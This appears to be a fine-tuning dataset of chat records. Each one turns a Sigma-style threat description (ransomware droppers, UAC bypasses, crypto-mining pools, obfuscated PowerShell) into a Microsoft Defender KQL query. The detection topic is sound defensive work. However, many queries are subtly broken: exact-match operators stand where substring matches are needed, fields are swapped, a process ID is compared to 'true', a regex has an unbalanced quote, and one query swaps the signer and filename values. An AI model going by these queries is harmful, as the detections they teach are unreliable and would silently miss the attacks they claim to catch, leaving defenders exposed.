{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects specific process characteristics of Maze ransomware word document droppers Topic: proc_creation_win_malware_maze_ransomware"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (InitiatingProcessFileName =~ \"\\\\WINWORD.exe\" and InitiatingProcessFolderPath =~ \".tmp\") or (ProcessCommandLine endswith \"shadowcopy delete\" and InitiatingProcessFileName =~ \"\\\\Temp\\\\\" and InitiatingProcessFolderPath =~ \"\\\\wmic.exe\") or (ProcessCommandLine has_all (\"\\\\..\\\\..\\\\system32\") and ProcessCommandLine endswith \"shadowcopy delete\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects usage of Windows Input Method Editor (IME) keyboard layout feature, which allows an attacker to load a DLL into the process after sending the WM_INPUTLANGCHANGEREQUEST message.\nBefore doing this, the client needs to register the DLL in a special registry key that is assumed to implement this keyboard layout. This registry key should store a value named \"Ime File\" with a DLL path.\nIMEs are essential for languages that have more characters than can be represented on a standard keyboard, such as Chinese, Japanese, and Korean.\n Topic: registry_set_ime_non_default_extension"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where (RegistryKey endswith \"\\\\Control\\\\Keyboard Layouts*\" and RegistryKey contains \"Ime File\") and (not(RegistryValueData endswith \".ime\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects changes to Microsoft Office protected view registry keys with which the attacker disables this feature. Topic: registry_set_office_disable_protected_view_features"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where (RegistryKey endswith \"\\\\SOFTWARE\\\\Microsoft\\\\Office*\" and RegistryKey endswith \"\\\\Security\\\\ProtectedView*\") and ((RegistryValueData =~ \"DWORD (0x00000001)\" and (RegistryKey endswith \"\\\\DisableAttachementsInPV\" or RegistryKey endswith \"\\\\DisableInternetFilesInPV\" or RegistryKey endswith \"\\\\DisableIntranetCheck\" or RegistryKey endswith \"\\\\DisableUnsafeLocationsInPV\")) or (RegistryValueData =~ \"DWORD (0x00000000)\" and (RegistryKey endswith \"\\\\enabledatabasefileprotectedview\" or RegistryKey endswith \"\\\\enableforeigntextfileprotectedview\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects suspicious remote procedure call (RPC) service anomalies based on the spawned sub processes (long shot to detect the exploitation of vulnerabilities like CVE-2022-26809) Topic: proc_creation_win_exploit_cve_2022_26809_rpcss_child_process_anomaly"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where InitiatingProcessCommandLine =~ \"-k RPCSS\" and InitiatingProcessFileName =~ \"C:\\\\Windows\\\\System32\\\\svchost.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects PowerShell creating a PowerShell file (.ps1). While often times this behavior is benign, sometimes it can be a sign of a dropper script trying to achieve persistence. Topic: file_event_win_powershell_drop_powershell"}, {"role": "assistant", "content": "DeviceFileEvents\n| where (FileName =~ \".ps1\" and (InitiatingProcessFolderPath in~ (\"\\\\powershell.exe\", \"\\\\pwsh.exe\"))) and (not((FileName in~ (\"C:\\\\Users\\\\\", \"__PSScriptPolicyTest_\", \"C:\\\\Windows\\\\Temp\\\\\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects execution of chromium based browser in headless mode using the \"dump-dom\" command line to download files Topic: proc_creation_win_browsers_chromium_headless_file_download"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"--headless\", \"dump-dom\", \"http\")) and (InitiatingProcessFolderPath in~ (\"\\\\brave.exe\", \"\\\\chrome.exe\", \"\\\\msedge.exe\", \"\\\\opera.exe\", \"\\\\vivaldi.exe\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects Elise backdoor activity used by APT32 Topic: proc_creation_win_malware_elise"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((ProcessCommandLine in~ (\"\\\\Windows\\\\Caches\\\\NavShExt.dll\", \"/c del\")) or InitiatingProcessFolderPath =~ \"\\\\Microsoft\\\\Network\\\\svchost.exe\") or (ProcessCommandLine =~ \",Setting\" and (ProcessCommandLine endswith \"\\\\AppData\\\\Roaming\\\\MICROS~1\\\\Windows\\\\Caches\\\\NavShExt.dll\" or ProcessCommandLine endswith \"\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Caches\\\\NavShExt.dll\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects a method often used by ransomware. Which combines the \"ping\" to wait a couple of seconds and then \"del\" to delete the file in question. Its used to hide the file responsible for the initial infection for example Topic: proc_creation_win_cmd_ping_del_combined_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"ping\", \"del \")) and (ProcessCommandLine contains \" -n \" or ProcessCommandLine contains \" /n \" or ProcessCommandLine contains \" \u2013n \" or ProcessCommandLine contains \" \u2014n \" or ProcessCommandLine contains \" \u2015n \") and (ProcessCommandLine contains \" -f \" or ProcessCommandLine contains \" /f \" or ProcessCommandLine contains \" \u2013f \" or ProcessCommandLine contains \" \u2014f \" or ProcessCommandLine contains \" \u2015f \" or ProcessCommandLine contains \" -q \" or ProcessCommandLine contains \" /q \" or ProcessCommandLine contains \" \u2013q \" or ProcessCommandLine contains \" \u2014q \" or ProcessCommandLine contains \" \u2015q \") and ProcessCommandLine =~ \"Nul\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects suspicious reconnaissance command line activity on Windows systems using the PowerShell Get-LocalGroupMember Cmdlet Topic: proc_creation_win_powershell_get_localgroup_member_recon"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine =~ \"Get-LocalGroupMember \" and (ProcessCommandLine in~ (\"domain admins\", \" administrator\", \" administrateur\", \"enterprise admins\", \"Exchange Trusted Subsystem\", \"Remote Desktop Users\", \"Utilisateurs du Bureau \u00e0 distance\", \"Usuarios de escritorio remoto\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution of WMIC in order to get a list of firewall and antivirus products Topic: proc_creation_win_wmic_recon_product_class"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"AntiVirusProduct\", \"FirewallProduct\")) and (FolderPath endswith \"\\\\wmic.exe\" or ProcessVersionInfoOriginalFileName =~ \"wmic.exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects specific process characteristics of Chinese TAIDOOR RAT malware load Topic: proc_creation_win_apt_taidoor"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"dll,MyStart\", \"dll MyStart\")) or (ProcessCommandLine has_all (\"rundll32.exe\") and ProcessCommandLine endswith \" MyStart\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects Obfuscated Powershell via Stdin in Scripts Topic: proc_creation_win_hktl_invoke_obfuscation_via_stdin"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine matches regex \"(?i)(set).*&&\\\\s?set.*(environment|invoke|\\\\$\\\\{?input).*&&.*\"\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects a potentially suspicious execution of a parent process located in the \"\\Users\\Public\" folder executing a child process containing references to shell or scripting binaries and commandlines.\n Topic: proc_creation_win_susp_execution_from_public_folder_as_parent"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((FolderPath endswith \"\\\\bitsadmin.exe\" or FolderPath endswith \"\\\\certutil.exe\" or FolderPath endswith \"\\\\cmd.exe\" or FolderPath endswith \"\\\\cscript.exe\" or FolderPath endswith \"\\\\mshta.exe\" or FolderPath endswith \"\\\\powershell.exe\" or FolderPath endswith \"\\\\pwsh.exe\" or FolderPath endswith \"\\\\regsvr32.exe\" or FolderPath endswith \"\\\\rundll32.exe\" or FolderPath endswith \"\\\\wscript.exe\") or (ProcessCommandLine contains \"bitsadmin\" or ProcessCommandLine contains \"certutil\" or ProcessCommandLine contains \"cscript\" or ProcessCommandLine contains \"mshta\" or ProcessCommandLine contains \"powershell\" or ProcessCommandLine contains \"regsvr32\" or ProcessCommandLine contains \"rundll32\" or ProcessCommandLine contains \"wscript\")) and InitiatingProcessFileName =~ \":\\\\Users\\\\Public\\\\\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects new commands that add new printer port which point to suspicious file Topic: proc_creation_win_exploit_cve_2020_1048"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine =~ \"Add-PrinterPort -Name\" and (ProcessCommandLine in~ (\".exe\", \".dll\", \".bat\"))) or ProcessCommandLine =~ \"Generic / Text Only\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects processes loading \"System.Drawing.ni.dll\". This could be an indicator of potential Screen Capture. Topic: image_load_dll_system_drawing_load"}, {"role": "assistant", "content": "DeviceImageLoadEvents\n| where FolderPath endswith \"\\\\System.Drawing.ni.dll\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects a specific file being created in the recent folder of Office. These files have been seen being dropped during potential exploitations of CVE-2023-36884 Topic: file_event_win_exploit_cve_2023_36884_office_windows_html_rce_file_patterns"}, {"role": "assistant", "content": "DeviceFileEvents\n| where FileName =~ \"\\\\file001.url\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution of certutil with either the \"decode\" or \"decodehex\" flags to decode base64 or hex encoded files. This can be abused by attackers to decode an encoded payload before execution Topic: proc_creation_win_certutil_decode"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (FolderPath endswith \"\\\\certutil.exe\" or ProcessVersionInfoOriginalFileName =~ \"CertUtil.exe\") and (ProcessCommandLine contains \"-decode \" or ProcessCommandLine contains \"/decode \" or ProcessCommandLine contains \"\u2013decode \" or ProcessCommandLine contains \"\u2014decode \" or ProcessCommandLine contains \"\u2015decode \" or ProcessCommandLine contains \"-decodehex \" or ProcessCommandLine contains \"/decodehex \" or ProcessCommandLine contains \"\u2013decodehex \" or ProcessCommandLine contains \"\u2014decodehex \" or ProcessCommandLine contains \"\u2015decodehex \")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects creation of cron file or files in Cron directories which could indicates potential persistence. Topic: file_event_lnx_persistence_cron_files"}, {"role": "assistant", "content": "DeviceFileEvents\n| where (FileName in~ (\"/etc/cron.d/\", \"/etc/cron.daily/\", \"/etc/cron.hourly/\", \"/etc/cron.monthly/\", \"/etc/cron.weekly/\", \"/var/spool/cron/crontabs/\")) or (FileName in~ (\"/etc/cron.allow\", \"/etc/cron.deny\", \"/etc/crontab\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects process connections to a Monero crypto mining pool Topic: net_connection_lnx_crypto_mining_indicators"}, {"role": "assistant", "content": "DeviceNetworkEvents\n| where RemoteUrl in~ (\"pool.minexmr.com\", \"fr.minexmr.com\", \"de.minexmr.com\", \"sg.minexmr.com\", \"ca.minexmr.com\", \"us-west.minexmr.com\", \"pool.supportxmr.com\", \"mine.c3pool.com\", \"xmr-eu1.nanopool.org\", \"xmr-eu2.nanopool.org\", \"xmr-us-east1.nanopool.org\", \"xmr-us-west1.nanopool.org\", \"xmr-asia1.nanopool.org\", \"xmr-jp1.nanopool.org\", \"xmr-au1.nanopool.org\", \"xmr.2miners.com\", \"xmr.hashcity.org\", \"xmr.f2pool.com\", \"xmrpool.eu\", \"pool.hashvault.pro\", \"moneroocean.stream\", \"monerocean.stream\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects execution of the built-in script located in \"C:\\Windows\\System32\\gatherNetworkInfo.vbs\". Which can be used to gather information about the target machine Topic: proc_creation_win_susp_gather_network_info_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine =~ \"gatherNetworkInfo.vbs\" and (not((InitiatingProcessFolderPath in~ (\"\\\\cscript.exe\", \"\\\\wscript.exe\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects usage of a base64 encoded \"IEX\" cmdlet in a process command line Topic: proc_creation_win_powershell_base64_iex"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine contains \"SUVYIChb\" or ProcessCommandLine contains \"lFWCAoW\" or ProcessCommandLine contains \"JRVggKF\" or ProcessCommandLine contains \"aWV4IChb\" or ProcessCommandLine contains \"lleCAoW\" or ProcessCommandLine contains \"pZXggKF\" or ProcessCommandLine contains \"aWV4IChOZX\" or ProcessCommandLine contains \"lleCAoTmV3\" or ProcessCommandLine contains \"pZXggKE5ld\" or ProcessCommandLine contains \"SUVYIChOZX\" or ProcessCommandLine contains \"lFWCAoTmV3\" or ProcessCommandLine contains \"JRVggKE5ld\" or ProcessCommandLine contains \"SUVYKF\" or ProcessCommandLine contains \"lFWChb\" or ProcessCommandLine contains \"JRVgoW\" or ProcessCommandLine contains \"aWV4KF\" or ProcessCommandLine contains \"lleChb\" or ProcessCommandLine contains \"pZXgoW\" or ProcessCommandLine contains \"aWV4KE5ld\" or ProcessCommandLine contains \"lleChOZX\" or ProcessCommandLine contains \"pZXgoTmV3\" or ProcessCommandLine contains \"SUVYKE5ld\" or ProcessCommandLine contains \"lFWChOZX\" or ProcessCommandLine contains \"JRVgoTmV3\" or ProcessCommandLine contains \"SUVYKCgn\" or ProcessCommandLine contains \"lFWCgoJ\" or ProcessCommandLine contains \"JRVgoKC\" or ProcessCommandLine contains \"aWV4KCgn\" or ProcessCommandLine contains \"lleCgoJ\" or ProcessCommandLine contains \"pZXgoKC\") or (ProcessCommandLine contains \"SQBFAFgAIAAoAFsA\" or ProcessCommandLine contains \"kARQBYACAAKABbA\" or ProcessCommandLine contains \"JAEUAWAAgACgAWw\" or ProcessCommandLine contains \"aQBlAHgAIAAoAFsA\" or ProcessCommandLine contains \"kAZQB4ACAAKABbA\" or ProcessCommandLine contains \"pAGUAeAAgACgAWw\" or ProcessCommandLine contains \"aQBlAHgAIAAoAE4AZQB3A\" or ProcessCommandLine contains \"kAZQB4ACAAKABOAGUAdw\" or ProcessCommandLine contains \"pAGUAeAAgACgATgBlAHcA\" or ProcessCommandLine contains \"SQBFAFgAIAAoAE4AZQB3A\" or ProcessCommandLine contains \"kARQBYACAAKABOAGUAdw\" or ProcessCommandLine contains \"JAEUAWAAgACgATgBlAHcA\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution of AdvancedRun utility in the context of the TrustedInstaller, SYSTEM, Local Service or Network Service accounts Topic: proc_creation_win_pua_advancedrun_priv_user"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"/EXEFilename\", \"/CommandLine\")) and ((ProcessCommandLine contains \" /RunAs 8 \" or ProcessCommandLine contains \" /RunAs 4 \" or ProcessCommandLine contains \" /RunAs 10 \" or ProcessCommandLine contains \" /RunAs 11 \") or (ProcessCommandLine endswith \"/RunAs 8\" or ProcessCommandLine endswith \"/RunAs 4\" or ProcessCommandLine endswith \"/RunAs 10\" or ProcessCommandLine endswith \"/RunAs 11\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the import of an alternate data stream with regini.exe, regini.exe can be used to modify registry keys. Topic: proc_creation_win_regini_ads"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (FolderPath endswith \"\\\\regini.exe\" or ProcessVersionInfoOriginalFileName =~ \"REGINI.EXE\") and ProcessCommandLine matches regex \":[^ \\\\\\\\]\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the usage of tooling to sniff network traffic.\nAn adversary may place a network interface into promiscuous mode to passively access data in transit over the network, or use span ports to capture a larger amount of data.\n Topic: proc_creation_macos_network_sniffing"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where InitiatingProcessFolderPath in~ (\"/tcpdump\", \"/tshark\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the creation of a file by \"dllhost.exe\" in System32 directory part of \"IDiagnosticProfileUAC\" UAC bypass technique Topic: file_event_win_uac_bypass_idiagnostic_profile"}, {"role": "assistant", "content": "DeviceFileEvents\n| where FileName =~ \".dll\" and InitiatingProcessFolderPath =~ \"\\\\DllHost.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects a network connection initiated by an \"Msiexec.exe\" process over port 80 or 443.\nAdversaries might abuse \"msiexec.exe\" to install and execute remotely hosted packages.\nUse this rule to hunt for potentially anomalous or suspicious communications.\n Topic: net_connection_win_msiexec_http"}, {"role": "assistant", "content": "DeviceNetworkEvents\n| where InitiatingProcessId =~ \"true\" and InitiatingProcessFolderPath =~ \"\\\\msiexec.exe\" and (RemotePort in~ (\"80\", \"443\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the presence of a file that is decrypted backdoor binary dropped by the Kapeka Dropper, which disguises itself as a hidden file under a folder named \"Microsoft\" within \"CSIDL_COMMON_APPDATA\" or \"CSIDL_LOCAL_APPDATA\", depending on the process privileges.\nThe file, typically 5-6 characters long with a random combination of consonants and vowels followed by a \".wll\" extension to pose as a legitimate file to evade detection.\n Topic: file_event_win_malware_kapeka_backdoor_indicators"}, {"role": "assistant", "content": "DeviceFileEvents\n| where FileName =~ \"\\\\[a-zA-Z]{5,6}\\\\.wll\" or (FileName in~ (\"\\\\win32log.exe\", \"\\\\crdss.exe\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects a network connection initiated by \"Regsvr32.exe\" Topic: net_connection_win_regsvr32_network_activity"}, {"role": "assistant", "content": "DeviceNetworkEvents\n| where InitiatingProcessId =~ \"true\" and InitiatingProcessFolderPath =~ \"\\\\regsvr32.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the pattern of UAC Bypass using IEInstal.exe (UACMe 64) Topic: file_event_win_uac_bypass_ieinstal"}, {"role": "assistant", "content": "DeviceFileEvents\n| where FileName =~ \"consent.exe\" and InitiatingProcessFolderPath =~ \"C:\\\\Program Files\\\\Internet Explorer\\\\IEInstal.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects registry modifications potentially related to the Ke3chang/TidePool malware as seen in campaigns running in 2019 and 2020 Topic: proc_creation_win_malware_ke3chang_tidepool"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine in~ (\"-Property DWORD -name DisableFirstRunCustomize -value 2 -Force\", \"-Property String -name Check_Associations -value\", \"-Property DWORD -name IEHarden -value 0 -Force\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects an unexpected file being deleted by dns.exe which my indicate activity related to remote code execution or other forms of exploitation as seen in CVE-2020-1350 (SigRed) Topic: file_delete_win_unusual_deletion_by_dns_exe"}, {"role": "assistant", "content": "DeviceFileEvents\n| where InitiatingProcessFolderPath =~ \"\\\\dns.exe\" and (not(FileName =~ \"\\\\dns.log\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects potential WerFault \"ReflectDebugger\" registry value abuse for persistence. Topic: registry_set_persistence_reflectdebugger"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where ActionType =~ \"RegistryValueSet\" and RegistryKey endswith \"\\\\Microsoft\\\\Windows\\\\Windows Error Reporting\\\\Hangs\\\\ReflectDebugger\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects a potentially suspicious execution from an uncommon folder. Topic: proc_creation_win_susp_execution_path"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (FolderPath contains \":\\\\Perflogs\\\\\" or FolderPath contains \":\\\\Users\\\\All Users\\\\\" or FolderPath contains \":\\\\Users\\\\Default\\\\\" or FolderPath contains \":\\\\Users\\\\NetworkService\\\\\" or FolderPath contains \":\\\\Windows\\\\addins\\\\\" or FolderPath contains \":\\\\Windows\\\\debug\\\\\" or FolderPath contains \":\\\\Windows\\\\Fonts\\\\\" or FolderPath contains \":\\\\Windows\\\\Help\\\\\" or FolderPath contains \":\\\\Windows\\\\IME\\\\\" or FolderPath contains \":\\\\Windows\\\\Media\\\\\" or FolderPath contains \":\\\\Windows\\\\repair\\\\\" or FolderPath contains \":\\\\Windows\\\\security\\\\\" or FolderPath contains \":\\\\Windows\\\\System32\\\\Tasks\\\\\" or FolderPath contains \":\\\\Windows\\\\Tasks\\\\\" or FolderPath contains \"$Recycle.bin\" or FolderPath contains \"\\\\config\\\\systemprofile\\\\\" or FolderPath contains \"\\\\Intel\\\\Logs\\\\\" or FolderPath contains \"\\\\RSA\\\\MachineKeys\\\\\") and (not((InitiatingProcessFolderPath in~ (\"\\\\CitrixReceiverUpdater.exe\", \"C:\\\\Users\\\\Public\\\\IBM\\\\ClientSolutions\\\\Start_Programs\\\\\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects potential \"ShellDispatch.dll\" functionality abuse to execute arbitrary binaries via \"ShellExecute\" Topic: proc_creation_win_rundll32_shelldispatch_potential_abuse"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine =~ \"RunDll_ShellExecuteW\" and (FolderPath endswith \"\\\\rundll32.exe\" or ProcessVersionInfoOriginalFileName =~ \"RUNDLL32.EXE\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects potential suspicious behaviour using secedit.exe. Such as exporting or modifying the security policy Topic: proc_creation_win_secedit_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (FolderPath endswith \"\\\\secedit.exe\" or ProcessVersionInfoOriginalFileName =~ \"SeCEdit\") and ((ProcessCommandLine in~ (\"/configure\", \"/db\")) or (ProcessCommandLine in~ (\"/export\", \"/cfg\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects .NET Framework CLR and .NET Core CLR \"cor_enable_profiling\" and \"cor_profiler\" variables being set and configured. Topic: registry_set_enabling_cor_profiler_env_variables"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where (RegistryKey endswith \"\\\\COR_ENABLE_PROFILING\" or RegistryKey endswith \"\\\\COR_PROFILER\" or RegistryKey endswith \"\\\\CORECLR_ENABLE_PROFILING\") or RegistryKey contains \"\\\\CORECLR_PROFILER_PATH\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the pattern of UAC Bypass using pkgmgr.exe and dism.exe (UACMe 23) Topic: proc_creation_win_uac_bypass_pkgmgr_dism"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where InitiatingProcessFileName =~ \"\\\\pkgmgr.exe\" and (InitiatingProcessIntegrityLevel in~ (\"High\", \"System\", \"S-1-16-16384\", \"S-1-16-12288\")) and InitiatingProcessFolderPath =~ \"\\\\dism.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects usage of OpenConsole binary as a LOLBIN to launch other binaries to bypass application Whitelisting Topic: proc_creation_win_lolbin_openconsole"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessVersionInfoOriginalFileName =~ \"OpenConsole.exe\" or FolderPath endswith \"\\\\OpenConsole.exe\") and (not(InitiatingProcessFolderPath =~ \"C:\\\\Program Files\\\\WindowsApps\\\\Microsoft.WindowsTerminal\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the abuse of custom file open handler, executing powershell Topic: registry_set_custom_file_open_handler_powershell_execution"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where RegistryKey endswith \"shell\\\\open\\\\command*\" and (RegistryValueData contains \"powershell\" and RegistryValueData contains \"-command\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects NetNTLM downgrade attack Topic: registry_event_net_ntlm_downgrade"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where (RegistryKey endswith \"SYSTEM*\" and RegistryKey contains \"ControlSet\" and RegistryKey contains \"\\\\Control\\\\Lsa\") and ((RegistryKey endswith \"\\\\lmcompatibilitylevel\" and (RegistryValueData in~ (\"DWORD (0x00000000)\", \"DWORD (0x00000001)\", \"DWORD (0x00000002)\"))) or (RegistryKey endswith \"\\\\NtlmMinClientSec\" and (RegistryValueData in~ (\"DWORD (0x00000000)\", \"DWORD (0x00000010)\", \"DWORD (0x00000020)\", \"DWORD (0x00000030)\"))) or RegistryKey endswith \"\\\\RestrictSendingNTLMTraffic\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the creation of a file with a suspicious extension in the public folder, which could indicate potential malicious activity. Topic: file_event_win_susp_public_folder_extension"}, {"role": "assistant", "content": "DeviceFileEvents\n| where FileName in~ (\".bat\", \".dll\", \".exe\", \".hta\", \".js\", \".ps1\", \".vbe\", \".vbs\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the mounting of Windows SMB shares over QUIC, which can be an unexpected event in some enterprise environments. Topic: proc_creation_win_net_quic"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine =~ \"/TRANSPORT:QUIC\" and ((FolderPath endswith \"\\\\net.exe\" or FolderPath endswith \"\\\\net1.exe\") or (ProcessVersionInfoOriginalFileName in~ (\"net.exe\", \"net1.exe\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects exploits that use CVE-2017-11882 to start EQNEDT32.EXE and other sub processes like mshta.exe Topic: proc_creation_win_exploit_cve_2017_11882"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where InitiatingProcessFileName =~ \"\\\\EQNEDT32.EXE\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects loading and execution of an unsigned thor scanner binary. Topic: image_load_thor_unsigned_execution"}, {"role": "assistant", "content": "DeviceImageLoadEvents\n| where ((FolderPath endswith \"\\\\thor.exe\" or FolderPath endswith \"\\\\thor64.exe\") and (InitiatingProcessFolderPath in~ (\"\\\\thor.exe\", \"\\\\thor64.exe\"))) and (not((InitiatingProcessVersionInfoCompanyName =~ \"valid\" and InitiatingProcessVersionInfoOriginalFileName =~ \"Nextron Systems GmbH\")))"}]}
